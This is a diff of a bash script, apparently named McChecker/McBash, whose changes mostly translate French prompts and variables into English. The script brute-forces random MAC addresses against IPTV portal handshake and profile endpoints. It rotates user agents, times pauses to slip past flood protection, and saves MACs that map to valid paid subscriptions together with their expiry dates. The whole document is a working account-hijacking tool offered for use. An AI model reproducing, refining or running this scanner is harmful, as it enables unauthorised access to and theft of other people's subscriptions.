@@ -15,69 +15,69 @@ ELEMENTS=${#args[@]} # nombre d'arguments
 for (( i=0;i<$ELEMENTS;i++));do
 	[[ $(echo ${args[${i}]}) == "-u" ]] && position_dns=$(( i + 1 )) && dns=${args[${position_argument_temps}]}
 	[[ $(echo ${args[${i}]} | grep -o "\.[a-z][a-z]" ) || $(echo ${args[${i}]} | grep -o "[0-9]*\.[0-9]*\.[0-9]*\.[0-9]*" ) ]] && dns=${args[${i}]}
-	[[ $(echo ${args[${i}]}) == "-w" ]] && position_argument_temps=$(( i + 1 )) && attente=${args[${position_argument_temps}]}
+	[[ $(echo ${args[${i}]}) == "-w" ]] && position_argument_temps=$(( i + 1 )) && request_delay=${args[${position_argument_temps}]}
 	[[ $(echo ${args[${i}]}) == "-t" ]] && position_argument_timeout=$(( i + 1 )) && timeout=${args[${position_argument_timeout}]}
-	[[ $(echo ${args[${i}]}) == "-p" ]] && position_argument_pause=$(( i + 1 )) && pause=${args[${position_argument_pause}]}
-	[[ $(echo ${args[${i}]}) == "-d" ]] && position_argument_duree_pause=$(( i + 1 )) && duree_pause=${args[${position_argument_duree_pause}]}
+	[[ $(echo ${args[${i}]}) == "-p" ]] && position_argument_timebreak=$(( i + 1 )) && timebreak=${args[${position_argument_timebreak}]}
+	[[ $(echo ${args[${i}]}) == "-d" ]] && position_argument_timebreak_duration=$(( i + 1 )) && timebreak_duration=${args[${position_argument_timebreak_duration}]}
 	[[ $(echo ${args[${i}]}) == "-s" ]] && position_argument_stop=$(( i + 1 )) && stopping=${args[${position_argument_stop}]}
-	[[ $(echo ${args[${i}]}) == "-k" ]] && position_argument_keep_expiree=$(( i + 1 )) && keep_expiree=${args[${position_argument_keep_expiree}]}
+	[[ $(echo ${args[${i}]}) == "-k" ]] && position_argument_keep_expired=$(( i + 1 )) && keep_expired=${args[${position_argument_keep_expired}]}
 	[[ $(echo ${args[${i}]}) == "-h" || $(echo ${args[${i}]}) == "--help" ]] && \
 		echo -e "Help menu : \
-		\n -k : Conserver les MAC expirées \
-		\n -p : Faire une pause toutes les [X] requêtes \
-		\n -d : Durée de la pause (en secondes) \
-		\n -s : Arrêter McChecker après [X] MAC scannées \
-		\n -t : Considérer un timeout après [X] secondes \
-		\n -u : URL du DNS \
-		\n -w : Attendre [X] secondes entre deux requêtes \
-		\n -h : Menu d'aide \
+		\n -k : Store expired MACs (valid addresses but expired accounts) \
+		\n -p : Make a break every [X] requests \
+		\n -d : Break duration (in seconds) \
+		\n -s : Stop McBash after [X] tested MACs \
+		\n -t : Consider request a timeout after [X] seconds \
+		\n -u : Server's URL/IP (specifying -u is not mandatory) \
+		\n -w : Wait [X] seconds between each requests \
+		\n -h : Print this help menu \
 		\n \
-		\n Exemple : mc -u my-dns.com:8080 -w 1.5 -p 10 -d 3 -s 150 -t 2
+		\n Example : mc -u my-dns.com:8080 -w 1.5 -p 10 -d 3 -s 150 -t 2 -k
 		" && exit 1
 done
 
-nom_dns() {
-	[[ ! -v dns  ]] && read -p "URL du DNS: "$(tput bold setf 4) dns
+dns_name() {
+	[[ ! -v dns  ]] && read -p "Server's URL/IP:port : "$(tput bold setf 4) dns
 	tput sgr0
-	[[ $dns = "" ]] && nom_dns
+	[[ $dns = "" ]] && dns_name
 	[[ $(echo $dns | grep -o 'http://') = "" ]] && dns=$(echo 'http://'$dns)
 }
 
-config_parametres() {
-	[[ ! -v attente && \
-		! -v pause && \
-		! -v duree_pause && \
+parameters() {
+	[[ ! -v request_delay && \
+		! -v timebreak && \
+		! -v timebreak_duration && \
 		! -v stopping && \
 		! -v timeout && \
-		! -v keep_expiree ]] && \
-		read -p "=> Paramétrer? [y/N] " parametres
+		! -v keep_expired ]] && \
+		read -p "=> Set parameters? [y/N] " parametres
 	if [[ $(echo $parametres | grep -io "y") == "y" ]]; then
-		[[ ! -v attente ]] && read -p " * Attendre [X] secondes entre deux requêtes [défaut:2] " attente
-		[[ $attente == "" ]] && attente=2
-		[[ ! -v pause ]] && read -p " * Faire une pause toutes les [X] requêtes [défaut:0] " pause
-		[[ $pause == "" ]] && unset pause
-		[[ ! -v duree_pause && $pause != "" ]] && read -p " * Durée de la pause (en secondes) [défaut:10] " duree_pause
-		[[ $duree_pause == "" ]] && unset duree_pause
-		[[ ! -v stopping ]] && read -p " * Arrêter McChecker après [X] MAC scannées [défaut:0] " stopping
+		[[ ! -v request_delay ]] && read -p " * Wait [X] seconds between two requests [default:2] " request_delay
+		[[ $request_delay == "" ]] && request_delay=2
+		[[ ! -v timebreak ]] && read -p " * Make a break every [X] requests [default:0] " timebreak
+		[[ $timebreak == "" ]] && unset timebreak
+		[[ ! -v timebreak_duration && $timebreak != "" ]] && read -p " * Break duration (seconds) [default:10] " timebreak_duration
+		[[ $timebreak_duration == "" ]] && unset timebreak_duration
+		[[ ! -v stopping ]] && read -p " * Stop McBash after [X] tested MACs [default:0] " stopping
 		[[ $stopping == "" ]] && unset stopping
-		[[ ! -v timeout ]] && read -p " * Considérer un timeout après [X] secondes [défaut:5] " timeout
+		[[ ! -v timeout ]] && read -p " * Consider request a timeout after [X] seconds [default:5] " timeout
 		[[ $timeout == "" ]] && unset timeout
-		[[ ! -v keep_expired ]] && read -p " * Conserver les MAC expirées [y/N] " keep_expiree
-		( [[ $keep_expiree == "" || $(echo $keep_expiree | grep -io "n") == "n" || $(echo $keep_expiree | grep -io "n") == "N" ]] ) && unset keep_expiree
+		[[ ! -v keep_expired ]] && read -p " * Store expired MACs (tagged as such)? [y/N] " keep_expired
+		( [[ $keep_expired == "" || $(echo $keep_expired | grep -io "n") == "n" || $(echo $keep_expired | grep -io "n") == "N" ]] ) && unset keep_expired
 		echo ""
 	else
 		return
 	fi
 }
 
-nom_dns
-config_parametres
+dns_name
+parameters
 
-[[ ! -v attente ]] && attente=2
-[[ ! -v duree_pause ]] && duree_pause=10
+[[ ! -v request_delay ]] && request_delay=2
+[[ ! -v timebreak_duration ]] && timebreak_duration=10
 [[ ! -v timeout ]] && timeout=5
 
-echo "$(tput bold)=> $(tput sgr0)Scan @ $(tput bold setf 4)$dns$(tput sgr0) $(tput setf 2)[$attente secondes/requête]$(tput sgr0)"
+echo "$(tput bold)=> $(tput sgr0)Scan @ $(tput bold setf 4)$dns$(tput sgr0) $(tput setf 2)[$request_delay seconds/request]$(tput sgr0)"
 
 random_user_agent() {
 	list_user_agent=("Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 2 rev: 250 Safari/533.3" "Mozilla/5.0 (X11; Linux i686; rv:93.0) Gecko/20100101 Firefox/93.0" "Mozilla/5.0 (Linux x86_64; rv:93.0) Gecko/20100101 Firefox/93.0" "Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:93.0) Gecko/20100101 Firefox/93.0" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:93.0) Gecko/20100101 Firefox/93.0" "Mozilla/5.0 (X11; Fedora; Linux x86_64; rv:93.0) Gecko/20100101 Firefox/93.0")
@@ -92,20 +92,20 @@ random_mac() {
 }
 
 item=0
-nb_mac_valides=0
+valid_macs_number=0
 handshake() {
 	item=$(( $item + 1 ))
-	[[ -v stopping ]] && [[ $(( $item - 1 )) == $stopping ]] && echo $(tput bold setf 6)"$(( $item - 1 )) MAC testées. $nb_mac_valides MAC valides. Arrêt."$(tput sgr0) && exit 1
-	[[ $item == 1 ]] || ( [[ -v pause ]] \
-		&& [[ $(expr $(( $item - 1 )) % $pause ) == 0 ]] \
-		&& echo -ne $(tput setf 4)"\r[$(( $item - 1 ))] $mac $(tput sgr0)$(tput setf 6)--- Pause. $duree_pause secondes..."$(tput sgr0) \
-		&& sleep $duree_pause ) || \
-		sleep $attente
+	[[ -v stopping ]] && [[ $(( $item - 1 )) == $stopping ]] && echo $(tput bold setf 6)"$(( $item - 1 )) tested MACs. $valid_macs_number valid. Stopping."$(tput sgr0) && exit 1
+	[[ $item == 1 ]] || ( [[ -v timebreak ]] \
+		&& [[ $(expr $(( $item - 1 )) % $timebreak ) == 0 ]] \
+		&& echo -ne $(tput setf 4)"\r[$(( $item - 1 ))] $mac $(tput sgr0)$(tput setf 6)--- Break. $timebreak_duration seconds..."$(tput sgr0) \
+		&& sleep $timebreak_duration ) || \
+		sleep $request_delay
 	random_mac
 	handshake_url=$(echo $dns)'/portal.php?action=handshake&type=stb&token=&mac='$(echo $encoded_mac)
 	cookie="mac=$mac; stb_lang=en; timezone=Europe/Amsterdam;"
 	random_user_agent
-	handshake_token=$(curl --max-time $timeout -s -X GET -H "Accept: */*" -H "User-Agent: $(echo $user_agent)" -H "Cookie: $(echo $cookie)" "$(echo $handshake_url)"); if [ $? -eq 28 ]; then echo -ne "\r\033[0KTimeout. Le serveur peut bloquer le flood. Nouvelle tentative dans $duree_pause secondes." && sleep $duree_pause && echo -ne "\r\033[0KNouvelle tentative..." && return; fi
+	handshake_token=$(curl --max-time $timeout -s -X GET -H "Accept: */*" -H "User-Agent: $(echo $user_agent)" -H "Cookie: $(echo $cookie)" "$(echo $handshake_url)"); if [ $? -eq 28 ]; then echo -ne "\r\033[0KTimeout. Server may protect against flood (we respect it). New attempt in $timebreak_duration seconds." && sleep $timebreak_duration && echo -ne "\r\033[0KNew attempt..." && return; fi
 	handshake_token=$(echo $handshake_token| grep -o '\"token\".*' | sed 's/\"token\":// ; s/\}\}//')
 	[[ $handshake_token = "" ]] && echo -ne "\r\033[0K$@$(tput setf 3)[$item]$(tput sgr0) $(tput setf 1)$mac $(tput sgr0)" && return # [vide]
 	authorization='Bearer '$(echo $handshake_token)
@@ -113,28 +113,28 @@ handshake() {
 	profile=$(curl --max-time $timeout -s -X GET -H "Accept: */*" -H "User-Agent: $(echo $user_agent)" -H "Authorization: $(echo $authorization)" -H "Cookie: $(echo $cookie)" "$(echo $profile_url)")
 	date_expiration=$(echo $profile | grep -o "\"phone\":\".*\"" | sed 's/\"phone\":\"//' | sed 's/\".*//')
 	[[ $date_expiration = "" ]] && \
-		( ( [[ ! -v keep_expiree ]] && echo -ne "\r$(tput setf 3)[$item]$(tput sgr0) $(tput setf 1)$mac [expired] $(tput sgr0)" && return ) || \
+		( ( [[ ! -v keep_expired ]] && echo -ne "\r$(tput setf 3)[$item]$(tput sgr0) $(tput setf 1)$mac [expired] $(tput sgr0)" && return ) || \
 			( echo -ne "\r$(tput setf 3)[$item]$(tput sgr0) $(tput setf 1)$mac [expired] $(tput sgr0)\n" && \
-			echo "$mac [expirée]" >> $destination/mac_valides_$nom ) )
+			echo "$mac [expired]" >> $destination/mac_valides_$nom ) )
 	nom=$(echo $dns | sed 's/http:\/\///' | sed 's/://')
 	echo "$mac [$date_expiration]" >> $destination/mac_valides_$nom
-	echo -ne "\r$(tput bold setf 2)[$item] $mac [VALIDE!] $(tput sgr0)\n"
-	nb_mac_valides=$(( $nb_mac_valides + 1 ))
+	echo -ne "\r$(tput bold setf 2)[$item] $mac [VALID!] $(tput sgr0)\n"
+	valid_macs_number=$(( $valid_macs_number + 1 ))
 }
 
 stty -echoctl
 function quitter_mc() {
 	echo ""
-	[[ $nb_mac_valides != 0 ]] && echo $(tput setf 2)"$nb_mac_valides MAC valides sur $(( $item - 1 )) testées." $(tput sgr0)
-	echo $(tput setf 6)--- Pause ---$(tput sgr0)
+	[[ $valid_macs_number != 0 ]] && echo $(tput setf 2)"$valid_macs_number valid for $(( $item - 1 )) tested MACs." $(tput sgr0)
+	echo $(tput setf 6)--- Break ---$(tput sgr0)
 	trap - SIGINT
-	read -p "$(tput bold setf 5)Quitter [Ctrl+C]  $(tput sgr0)-  $(tput bold setf 4)Reprendre [Entrée]$(tput sgr0) " quit_mc
+	read -p "$(tput bold setf 5)Quit [Ctrl+C]  $(tput sgr0)-  $(tput bold setf 4)Resume [Enter]$(tput sgr0) " quit_mc
 	( [[ $(echo $quit_mc | grep -io "y") ]] && \
-		if [ $nb_mac_valides != 0 ]; then
-			echo $(tput setf 2)"Fichier sauvegardé => $destination/mac_valides_$nom"$(tput sgr0)
+		if [ $valid_macs_number != 0 ]; then
+			echo $(tput setf 2)"File saved => $destination/valid_macs_$nom"$(tput sgr0)
 		fi && \
 			exit ) ||
-			( ( [[ $nb_mac_valides != 0 ]] && echo -ne "\r\033[1A\033[0K$@\r\033[1A\033[0K$@\r\033[1A\033[0K$@\r\033[1A\033[0K$@" ) || \
+			( ( [[ $valid_macs_number != 0 ]] && echo -ne "\r\033[1A\033[0K$@\r\033[1A\033[0K$@\r\033[1A\033[0K$@\r\033[1A\033[0K$@" ) || \
 			echo -ne "\r\033[1A\033[0K$@\r\033[1A\033[0K$@\r\033[1A\033[0K$@" )
 }
 
